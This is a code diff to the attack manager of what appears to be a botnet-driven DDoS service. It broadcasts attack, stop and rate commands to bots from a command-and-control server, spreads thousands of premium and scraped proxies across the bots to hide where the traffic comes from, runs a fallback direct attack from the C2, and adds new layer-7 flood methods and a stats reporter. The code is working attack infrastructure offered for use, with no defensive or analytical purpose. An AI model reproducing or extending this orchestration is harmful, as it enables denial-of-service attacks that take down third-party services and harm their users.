@@ -12,6 +12,7 @@ from app.core.models import AttackStatus, AttackRequest, AttackResult
 from app.managers.concurrent_manager import concurrent_manager
 from app.managers.history_manager import history_manager
 from app.managers.proxy_manager import proxy_manager
+from app.managers.premium_proxy_manager import premium_proxy_manager, IPRoyalConfig
 
 from app.engine.layer7 import run_layer7_attack
 from app.engine.layer4 import run_layer4_attack
@@ -25,6 +26,7 @@ class AttackManager:
         self._lock = asyncio.Lock()
         self._botnet_manager = None  # Lazy loaded
         self._auto_stop_tasks: Dict[str, asyncio.Task] = {}
+        self._stats_reporters: Dict[str, asyncio.Task] = {}
 
     @property
     def botnet_manager(self):
@@ -62,15 +64,16 @@ class AttackManager:
 
         rps_limit = await self._get_rps_limit()
 
-        # FIX #1: Get proxies for bot distribution (primary pool)
-        bot_proxies = await proxy_manager.get_mixed_proxies(count=2000)
+        # FIX v9.0: Get proxies with premium mix
+        # 60% premium (IPRoyal) + 40% bulk (scraped)
+        bot_proxies = await proxy_manager.get_mixed_proxies(count=5000)
         if not bot_proxies:
-            logger.warning("[ATTACK] No proxies in pool! Running emergency refresh...")
+            logger.warning("[ATTACK-v9.0] No proxies in pool! Running emergency refresh...")
             await proxy_manager.emergency_refresh()
-            bot_proxies = await proxy_manager.get_mixed_proxies(count=2000)
+            bot_proxies = await proxy_manager.get_mixed_proxies(count=5000)
 
         proxy_count = len(bot_proxies)
-        logger.info(f"[ATTACK] Fetched {proxy_count} proxies from pool")
+        logger.info(f"[ATTACK-v9.0] Fetched {proxy_count} mixed proxies (premium + bulk)")
 
         bot_ids = await self.botnet_manager.get_active_bot_ids()
         bot_count = len(bot_ids)
@@ -85,13 +88,8 @@ class AttackManager:
                 rps_per_bot = 0
             logger.info(f"📊 Distribution: {rps_limit} RPS / {bot_count} bots = {rps_per_bot} RPS/bot | {proxy_count} proxies")
 
-        # FIX #2: Distribute proxies to bots - bots get 80% of pool
+        # Distribute proxies to bots
         if bot_count > 0 and bot_proxies:
-            # Split proxies: 80% for bots, 20% reserved for C2 direct fallback
-            bot_proxy_count = int(len(bot_proxies) * 0.8)
-            bot_proxies_distributed = bot_proxies[:bot_proxy_count]
-            direct_proxies_reserved = bot_proxies[bot_proxy_count:]
-
             attack_data = {
                 "attack_id": attack_id,
                 "method": req.method,
@@ -103,17 +101,20 @@ class AttackManager:
                 "extra": "",
             }
 
-            result = await self.botnet_manager.broadcast_attack_with_proxies(attack_data, bot_proxies_distributed)
+            result = await self.botnet_manager.broadcast_attack_with_proxies(attack_data, bot_proxies)
             logger.info(f"📡 Botnet broadcast result: {result}")
 
-            # FIX #3: Store reserved proxies for C2 direct attack fallback
+            # Store reserved proxies for C2 direct fallback
+            direct_proxies_reserved = bot_proxies[-min(500, len(bot_proxies)//5):] if len(bot_proxies) > 100 else []
             if direct_proxies_reserved:
                 await self._save_direct_proxies(attack_id, direct_proxies_reserved)
         elif bot_count > 0:
             # No proxies but bots connected - send without proxies
+            logger.warning(f"📡 Sending attack to {bot_count} bots WITHOUT proxies!")
             for bot_id in bot_ids:
                 asyncio.create_task(
                     self.botnet_manager.send_to_bot(bot_id, {
+                        "type": "command",
                         "cmd": "attack",
                         "attack_id": attack_id,
                         "method": req.method,
@@ -125,35 +126,38 @@ class AttackManager:
                         "proxies": [],
                     })
                 )
-            logger.warning(f"📡 Sent attack to {bot_count} bots WITHOUT proxies!")
 
-        # FIX #4: C2 direct attack only runs if NO bots connected, or with minimal reserved proxies
+        # C2 direct attack - runs alongside botnet
         if bot_count == 0:
-            # No bots - C2 runs full direct attack with all proxies
+            # No bots - C2 runs full direct attack
             task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit, bot_proxies))
         else:
-            # Bots active - C2 runs minimal direct attack with reserved proxies only
+            # Bots active - C2 runs minimal direct attack with reserved proxies
             direct_proxies = await self._get_direct_proxies(attack_id)
             if direct_proxies:
-                logger.info(f"[ATTACK] C2 running minimal direct attack with {len(direct_proxies)} reserved proxies")
+                logger.info(f"[ATTACK-v9.0] C2 running minimal direct attack with {len(direct_proxies)} reserved proxies")
                 task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit // 10, direct_proxies))
             else:
-                logger.info(f"[ATTACK] Bots active, C2 direct attack skipped (coordinator mode)")
-                # Create dummy task that just waits
+                logger.info(f"[ATTACK-v9.0] Bots active, C2 direct attack skipped (coordinator mode)")
                 task = asyncio.create_task(self._coordinator_mode(attack_id, req.duration + (req.hold_time or 0)))
 
         self.attack_tasks[attack_id] = task
 
         total_duration = req.duration + (req.hold_time or 0)
 
-        # FIX #5: Store auto-stop task so we can cancel it on manual stop
+        # Auto-stop task
         auto_task = asyncio.create_task(self._auto_finalize(attack_id, total_duration))
         self._auto_stop_tasks[attack_id] = auto_task
 
+        # Stats reporter
+        stats_task = asyncio.create_task(self._stats_reporter(attack_id))
+        self._stats_reporters[attack_id] = stats_task
+
+        # Mid-attack proxy refresh for long attacks
         if req.duration > 300:
             asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))
 
-        # FIX #6: Broadcast attack started via WebSocket
+        # Broadcast attack started
         await self._broadcast_attack_event("attack_started", attack_id, {
             "method": req.method,
             "target": req.target,
@@ -182,15 +186,25 @@ class AttackManager:
 
         return attack_id
 
-    # FIX #7: New helper methods for proxy reservation
+    async def _stats_reporter(self, attack_id: str):
+        """Report stats every 5 seconds"""
+        while attack_id in self.active_attacks:
+            await asyncio.sleep(5)
+            if attack_id not in self.active_attacks:
+                break
+
+            attack = self.active_attacks[attack_id]
+            bot_ids = await self.botnet_manager.get_active_bot_ids()
+            proxy_stats = await proxy_manager.get_stats()
+
+            logger.info(f"[STATS] {attack_id} | RPS: {attack.rps} | Total: {attack.total_requests} | Proxies: {attack.proxy_count_current} | Bots: {len(bot_ids)} | Pool: {proxy_stats.alive}")
+
     async def _save_direct_proxies(self, attack_id: str, proxies: List[str]):
-        """Save reserved proxies for C2 direct attack in Redis."""
         redis = await get_redis()
         key = f"scythe:direct_proxies:{attack_id}"
         await redis.set(key, str(proxies), ex=3600)
 
     async def _get_direct_proxies(self, attack_id: str) -> List[str]:
-        """Get reserved proxies for C2 direct attack."""
         redis = await get_redis()
         key = f"scythe:direct_proxies:{attack_id}"
         data = await redis.get(key)
@@ -203,14 +217,13 @@ class AttackManager:
         return []
 
     async def _coordinator_mode(self, attack_id: str, duration: int):
-        """C2 coordinator mode - just monitors, no direct attack."""
+        """C2 coordinator mode - monitors, no direct attack"""
         logger.info(f"[COORDINATOR] Attack {attack_id} in coordinator mode for {duration}s")
         await asyncio.sleep(duration + 5)
         if attack_id in self.active_attacks:
             await self._finalize_attack(attack_id)
 
     async def _broadcast_attack_event(self, event_type: str, attack_id: str, data: dict):
-        """Broadcast attack events via WebSocket."""
         try:
             from app.main import broadcast_ws_message
             await broadcast_ws_message("attack_update", {
@@ -228,19 +241,18 @@ class AttackManager:
 
         if attack_id in self.active_attacks:
             logger.info(f"[AUTO] Auto-finalizing attack {attack_id} after {total_duration}s")
-            # FIX #8: Broadcast stop to bots BEFORE finalizing
             await self._broadcast_stop_to_bots(attack_id)
             await self._finalize_attack(attack_id)
         else:
             logger.debug(f"[AUTO] Attack {attack_id} already finalized, skipping")
 
     async def _broadcast_stop_to_bots(self, attack_id: str):
-        """FIX: Always broadcast stop to bots when attack ends."""
         try:
             bot_ids = await self.botnet_manager.get_active_bot_ids()
             if bot_ids:
                 logger.info(f"[STOP] Broadcasting stop for {attack_id} to {len(bot_ids)} bots")
                 await self.botnet_manager.broadcast_command({
+                    "type": "command",
                     "cmd": "stop",
                     "attack_id": attack_id
                 })
@@ -263,7 +275,8 @@ class AttackManager:
                 break
 
             try:
-                fresh_proxies = await proxy_manager.get_mixed_proxies(count=1500)
+                # Refresh both premium and bulk proxies
+                fresh_proxies = await proxy_manager.get_mixed_proxies(count=3000)
                 if not fresh_proxies:
                     logger.warning(f"[REFRESH] No fresh proxies for {attack_id}")
                     continue
@@ -289,7 +302,6 @@ class AttackManager:
                     pass
                 del self.attack_tasks[attack_id]
 
-            # FIX #9: Cancel auto-stop task
             if attack_id in self._auto_stop_tasks:
                 self._auto_stop_tasks[attack_id].cancel()
                 try:
@@ -298,14 +310,18 @@ class AttackManager:
                     pass
                 del self._auto_stop_tasks[attack_id]
 
+            if attack_id in self._stats_reporters:
+                self._stats_reporters[attack_id].cancel()
+                try:
+                    await self._stats_reporters[attack_id]
+                except asyncio.CancelledError:
+                    pass
+                del self._stats_reporters[attack_id]
+
             attack = self.active_attacks.pop(attack_id, None)
 
         await self._remove_attack_from_redis(attack_id)
-
-        # FIX #10: Broadcast stop to bots
         await self._broadcast_stop_to_bots(attack_id)
-
-        # FIX #11: Broadcast attack stopped event
         await self._broadcast_attack_event("attack_stopped", attack_id, {
             "total_requests": attack.total_requests if attack else 0,
             "avg_rps": (attack.total_requests // max(1, attack.duration)) if attack else 0,
@@ -333,12 +349,12 @@ class AttackManager:
         for aid in attack_ids:
             if await self.stop_attack(aid):
                 count += 1
-        # FIX #12: Also broadcast global stop to all bots
         try:
             bot_ids = await self.botnet_manager.get_active_bot_ids()
             if bot_ids:
                 logger.info(f"[STOPALL] Broadcasting stop-all to {len(bot_ids)} bots")
                 await self.botnet_manager.broadcast_command({
+                    "type": "command",
                     "cmd": "stop"
                 })
         except Exception as e:
@@ -375,7 +391,6 @@ class AttackManager:
                         data[field] = int(data[field])
                 attack = AttackStatus(**data)
                 self.active_attacks[aid] = attack
-                # FIX #13: Don't auto-restart direct attack on restore if bots were active
                 bot_ids = await self.botnet_manager.get_active_bot_ids()
                 if len(bot_ids) == 0:
                     task = asyncio.create_task(self._run_direct_attack(aid, 0, []))
@@ -415,6 +430,7 @@ class AttackManager:
         for bot_id in bot_ids:
             asyncio.create_task(
                 self.botnet_manager.send_to_bot(bot_id, {
+                    "type": "command",
                     "cmd": "update_rps",
                     "attack_id": attack_id,
                     "rps_limit": rps_per_bot,
@@ -441,7 +457,7 @@ class AttackManager:
         if not attack:
             return
 
-        if attack.method.lower() in ["spectre", "vortex", "titan", "phantom", "serpent", "storm"]:
+        if attack.method.lower() in ["spectre", "vortex", "titan", "phantom", "serpent", "storm", "nova", "havoc"]:
             engine_func = run_layer7_attack
         else:
             engine_func = run_layer4_attack
@@ -483,8 +499,6 @@ class AttackManager:
         attack.proxy_count_current = proxy_count
 
         await self._save_attack_to_redis(attack)
-
-        # FIX #14: Broadcast progress update via WebSocket
         await self._broadcast_attack_event("attack_progress", attack_id, {
             "rps": rps,
             "total_requests": total_requests,
@@ -501,6 +515,8 @@ class AttackManager:
                 del self.attack_tasks[attack_id]
             if attack_id in self._auto_stop_tasks:
                 del self._auto_stop_tasks[attack_id]
+            if attack_id in self._stats_reporters:
+                del self._stats_reporters[attack_id]
 
             await self._remove_attack_from_redis(attack_id)
 
@@ -518,8 +534,6 @@ class AttackManager:
                 "avg_rps": avg_rps,
                 "duration": attack.duration
             })
-
-            # FIX #15: Broadcast attack completed event
             await self._broadcast_attack_event("attack_completed", attack_id, {
                 "total_requests": attack.total_requests,
                 "avg_rps": avg_rps,
@@ -536,7 +550,6 @@ class AttackManager:
         r = await get_redis()
         await r.delete(RedisKeys.attack(attack_id))
         await r.srem(RedisKeys.active_attacks(), attack_id)
-        # FIX #16: Clean up direct proxies
         await r.delete(f"scythe:direct_proxies:{attack_id}")
 
 
